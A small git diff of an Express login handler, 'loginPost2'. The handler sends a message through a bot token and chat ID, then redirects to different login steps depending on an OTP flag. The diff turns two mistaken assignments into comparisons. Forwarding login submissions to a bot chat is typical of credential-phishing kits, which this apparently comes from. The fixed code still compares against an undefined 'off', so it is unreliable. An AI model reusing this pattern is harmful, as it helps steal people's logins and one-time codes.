@@ -109,9 +109,9 @@ exports.loginPost2 = async (req, res) => {
 
         const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
         sendMessage(message);
-		if(otp = "on"){
+		if(otp == "on"){
         res.redirect("/auth/login/5");
-        }else if (otp = off){
+        }else if (otp == off){
         	res.redirect("/auth/login/3");
         	}
     } catch (error) {
